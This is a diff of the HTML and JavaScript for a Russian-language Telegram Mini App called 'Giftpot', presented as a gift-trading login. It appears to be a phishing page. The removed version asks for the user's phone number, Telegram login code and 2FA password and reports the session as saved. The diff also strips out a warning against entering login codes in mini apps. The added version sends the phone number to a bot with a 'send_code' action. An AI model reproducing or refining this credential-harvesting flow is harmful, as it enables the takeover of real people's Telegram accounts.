@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GiftPot Auth</title>
+    <title>Giftpot - Trade & Safe</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -20,15 +20,6 @@
             justify-content: center;
             padding: 20px;
             background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
-            background-size: 400% 400%;
-            animation: gradientShift 10s ease infinite;
-            overflow: hidden;
-        }
-        
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
         }
         
         .container {
@@ -70,10 +61,6 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
         }
         
         .btn:active {
@@ -83,11 +70,6 @@
         .btn:disabled {
             background: #cbd5e1;
             cursor: not-allowed;
-        }
-        
-        .telegram-icon {
-            width: 24px;
-            height: 24px;
         }
         
         .step {
@@ -100,20 +82,8 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .success-icon {
-            font-size: 64px;
-            margin-bottom: 16px;
-            animation: popIn 0.5s ease;
-        }
-        
-        @keyframes popIn {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         
         .loader {
@@ -138,16 +108,6 @@
             margin: 16px 0;
             font-size: 13px;
             color: #92400e;
-            text-align: left;
-        }
-
-        .info-box {
-            background: rgba(59, 130, 246, 0.1);
-            border-radius: 8px;
-            padding: 12px;
-            margin: 16px 0;
-            font-size: 13px;
-            color: #1e40af;
         }
 
         .phone-input {
@@ -157,12 +117,23 @@
             border-radius: 12px;
             font-size: 16px;
             margin-bottom: 16px;
-            transition: border-color 0.3s;
         }
 
         .phone-input:focus {
             outline: none;
             border-color: #3b82f6;
+        }
+
+        .debug {
+            margin-top: 16px;
+            padding: 12px;
+            background: #f1f5f9;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #475569;
+            text-align: left;
+            max-height: 200px;
+            overflow-y: auto;
         }
     </style>
 </head>
@@ -176,59 +147,42 @@
                 <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
                 <circle cx="75" cy="70" r="10" fill="black"/>
                 <circle cx="125" cy="70" r="10" fill="black"/>
-                <ellipse cx="100" cy="100" rx="35" ry="8" fill="none" stroke="black" stroke-width="2"/>
-                <ellipse cx="100" cy="105" rx="30" ry="6" fill="none" stroke="black" stroke-width="2"/>
-                <ellipse cx="100" cy="110" rx="25" ry="5" fill="none" stroke="black" stroke-width="2"/>
-                <ellipse cx="70" cy="120" rx="25" ry="15" fill="white" stroke="black" stroke-width="3"/>
-                <ellipse cx="130" cy="120" rx="25" ry="15" fill="white" stroke="black" stroke-width="3"/>
-                <ellipse cx="50" cy="170" rx="20" ry="12" fill="white" stroke="black" stroke-width="3"/>
-                <rect x="45" y="140" width="10" height="30" fill="white" stroke="black" stroke-width="3" rx="5"/>
-                <ellipse cx="150" cy="170" rx="20" ry="12" fill="white" stroke="black" stroke-width="3"/>
-                <rect x="145" y="140" width="10" height="30" fill="white" stroke="black" stroke-width="3" rx="5"/>
             </svg>
             
-            <h1>Giftpot - Trade & Safe</h1>
-            <p class="subtitle">Здесь начинается мир продажи и<br>обмена подарками</p>
+            <h1>Giftpot</h1>
+            <p class="subtitle">Здесь начинается мир продажи и
+обмена подарками
+
+</p>
             
-            <button class="btn" id="login-btn" onclick="requestPhoneNumber()">
-                <svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-                </svg>
+            <button class="btn" id="login-btn" onclick="showPhoneStep()">
                 Войти через Telegram
             </button>
 
-            <div class="warning">
-                ⚠️ Внимание! Никогда не вводите коды входа в Telegram в мини-приложениях.
-            </div>
+        
             
-            <p style="margin-top: 16px; color: #94a3b8; font-size: 12px;">@Giftpotrubot</p>
+            <div id="debug-info" class="debug" style="display: none;"></div>
         </div>
 
         <!-- Phone Input Step -->
         <div id="phone-step" class="step">
             <svg class="mascot" viewBox="0 0 200 200">
                 <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
                 <circle cx="75" cy="70" r="10" fill="black"/>
                 <circle cx="125" cy="70" r="10" fill="black"/>
             </svg>
             
-            <h1>Введите номер телефона</h1>
-            <p class="subtitle">Укажите номер в формате:<br>+1234567890</p>
+            <h1>Введите номер</h1>
+            <p class="subtitle">Формат: +1234567890</p>
             
             <input 
                 type="tel" 
                 id="phone-input" 
                 class="phone-input" 
                 placeholder="+1234567890"
-                pattern="\+?[0-9]+"
             />
             
-            <button class="btn" onclick="submitPhone()">
-                Продолжить
-            </button>
-            
+            <button class="btn" onclick="submitPhone()">Продолжить</button>
             <button class="btn" onclick="showStep('welcome-step')" style="margin-top: 12px; background: #94a3b8;">
                 Назад
             </button>
@@ -236,79 +190,16 @@
 
         <!-- Loading Step -->
         <div id="loading-step" class="step">
-            <svg class="mascot" viewBox="0 0 200 200" style="opacity: 0.5;">
-                <ellipse cx="100" cy="90" rx="60" ry="70" fill="#ccc"/>
-                <circle cx="75" cy="70" r="18" fill="#999"/>
-                <circle cx="125" cy="70" r="18" fill="#999"/>
-            </svg>
-            
-            <h1>Отправляем запрос</h1>
-            <p class="subtitle" style="margin-top: 16px;">Пожалуйста, подождите</p>
-            
+            <h1>Отправка...</h1>
             <div class="loader"></div>
-        </div>
-
-        <!-- Code Input Step -->
-        <div id="code-step" class="step">
-            <svg class="mascot" viewBox="0 0 200 200">
-                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="75" cy="70" r="10" fill="black"/>
-                <circle cx="125" cy="70" r="10" fill="black"/>
-            </svg>
-            
-            <h1>Введите код</h1>
-            <p class="subtitle">Код отправлен в ваш Telegram</p>
-            
-            <input 
-                type="text" 
-                id="code-input" 
-                class="phone-input" 
-                placeholder="12345"
-                maxlength="6"
-                inputmode="numeric"
-            />
-            
-            <button class="btn" onclick="submitCode()">
-                Подтвердить
-            </button>
-        </div>
-
-        <!-- Password Step (2FA) -->
-        <div id="password-step" class="step">
-            <svg class="mascot" viewBox="0 0 200 200">
-                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
-                <circle cx="75" cy="70" r="10" fill="black"/>
-                <circle cx="125" cy="70" r="10" fill="black"/>
-            </svg>
-            
-            <h1>Введите пароль 2FA</h1>
-            <p class="subtitle">Ваш аккаунт защищен двухфакторной аутентификацией</p>
-            
-            <input 
-                type="password" 
-                id="password-input" 
-                class="phone-input" 
-                placeholder="Пароль"
-            />
-            
-            <button class="btn" onclick="submitPassword()">
-                Подтвердить
-            </button>
+            <p class="subtitle" id="loading-text">Подождите</p>
         </div>
 
         <!-- Success Step -->
         <div id="success-step" class="step">
-            <div class="success-icon">✅</div>
-            <h1>Успешно!</h1>
-            <p class="subtitle">Авторизация завершена.<br>Сессия сохранена.</p>
-            
-            <div class="info-box">
-                💡 Теперь вы можете использовать бота
-            </div>
+            <div style="font-size: 64px; margin-bottom: 16px;">✅</div>
+            <h1>Готово!</h1>
+            <p class="subtitle">Проверьте бота</p>
         </div>
 
         <!-- Error Step -->
@@ -316,28 +207,36 @@
             <div style="font-size: 64px; margin-bottom: 16px;">❌</div>
             <h1>Ошибка</h1>
             <p class="subtitle" id="error-message">Что-то пошло не так</p>
-            <button class="btn" onclick="showStep('welcome-step'); isRequesting = false;">Попробовать снова</button>
+            <button class="btn" onclick="showStep('welcome-step')">Попробовать снова</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        
-        // Инициализация Mini App
         tg.ready();
         tg.expand();
-        tg.enableClosingConfirmation();
-        
-        // Применяем тему Telegram
-        if (tg.themeParams.bg_color) {
-            document.body.style.background = tg.themeParams.bg_color;
-        }
 
-        let isRequesting = false;
+        // Debug info
+        const debugInfo = {
+            version: tg.version,
+            platform: tg.platform,
+            user: tg.initDataUnsafe?.user,
+            initData: tg.initData ? 'present' : 'missing'
+        };
+        
+        document.getElementById('debug-info').textContent = JSON.stringify(debugInfo, null, 2);
+        console.log('Telegram WebApp:', debugInfo);
 
         function showStep(stepId) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById(stepId).classList.add('active');
+        }
+
+        function showPhoneStep() {
+            showStep('phone-step');
+            setTimeout(() => {
+                document.getElementById('phone-input').focus();
+            }, 300);
         }
 
         function showError(message) {
@@ -345,103 +244,66 @@
             showStep('error-step');
         }
 
-        // Попытка использовать requestContact (если доступно в вашей версии)
-        function requestPhoneNumber() {
-            if (isRequesting) return;
-            
-            const loginBtn = document.getElementById('login-btn');
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Запрос разрешения...';
-
-            // Проверяем доступность метода requestContact
-            if (typeof tg.requestContact === 'function') {
-                console.log('Using requestContact method');
-                tg.requestContact((status, contact) => {
-                    if (status && contact) {
-                        sendPhoneToBotViaData(contact.phone_number);
-                    } else {
-                        // Если не удалось - переходим к ручному вводу
-                        showStep('phone-step');
-                        loginBtn.disabled = false;
-                        loginBtn.innerHTML = '<svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>Войти через Telegram';
-                        isRequesting = false;
-                    }
-                });
-            } else {
-                // Если метода нет - сразу показываем форму ввода
-                console.log('requestContact not available, showing manual input');
-                showStep('phone-step');
-                loginBtn.disabled = false;
-                loginBtn.innerHTML = '<svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>Войти через Telegram';
-                isRequesting = false;
-            }
-        }
-
         function submitPhone() {
             const phoneInput = document.getElementById('phone-input');
             let phone = phoneInput.value.trim();
 
-            // Валидация номера
             if (!phone) {
-                alert('Пожалуйста, введите номер телефона');
+                alert('Введите номер телефона');
                 return;
             }
 
-            // Добавляем + если его нет
             if (!phone.startsWith('+')) {
                 phone = '+' + phone;
             }
 
-            // Проверяем формат
             if (!/^\+?[0-9]{10,15}$/.test(phone)) {
-                alert('Неверный формат номера. Используйте формат: +1234567890');
+                alert('Неверный формат. Пример: +1234567890');
                 return;
             }
 
-            sendPhoneToBotViaData(phone);
+            sendPhoneToBot(phone);
         }
 
-        function sendPhoneToBotViaData(phone) {
+        function sendPhoneToBot(phone) {
             showStep('loading-step');
-            isRequesting = true;
+            document.getElementById('loading-text').textContent = 'Отправка номера...';
 
-            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                console.log('Sending phone to bot:', phone);
+            const data = JSON.stringify({
+                action: 'send_code',
+                phone: phone
+            });
+
+            console.log('Sending data to bot:', data);
+
+            try {
+                tg.sendData(data);
                 
-                // Отправляем данные боту
-                tg.sendData(JSON.stringify({
-                    action: 'request_phone',
-                    phone: phone,
-                    user_id: tg.initDataUnsafe.user.id
-                }));
-
                 // Показываем успех
                 setTimeout(() => {
                     showStep('success-step');
                     
-                    // Закрываем через 3 секунды
+                    // Закрываем через 2 секунды
                     setTimeout(() => {
                         tg.close();
-                    }, 3000);
-                }, 1000);
-            } else {
-                showError('Не удалось определить пользователя Telegram');
-                isRequesting = false;
+                    }, 2000);
+                }, 500);
+            } catch (error) {
+                console.error('Error sending data:', error);
+                showError('Ошибка отправки: ' + error.message);
             }
         }
 
-        // Логирование для отладки
-        console.log('Telegram WebApp initialized:', {
-            version: tg.version,
-            platform: tg.platform,
-            initData: tg.initData ? 'present' : 'missing',
-            user: tg.initDataUnsafe?.user,
-            hasRequestContact: typeof tg.requestContact === 'function'
+        // Показать debug info при долгом нажатии на заголовок
+        let pressTimer;
+        document.querySelector('h1').addEventListener('touchstart', () => {
+            pressTimer = setTimeout(() => {
+                const debug = document.getElementById('debug-info');
+                debug.style.display = debug.style.display === 'none' ? 'block' : 'none';
+            }, 2000);
         });
-
-        // Автофокус на input при открытии формы
-        document.getElementById('phone-input').addEventListener('focus', function() {
-            this.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        document.querySelector('h1').addEventListener('touchend', () => {
+            clearTimeout(pressTimer);
         });
     </script>
 </body>
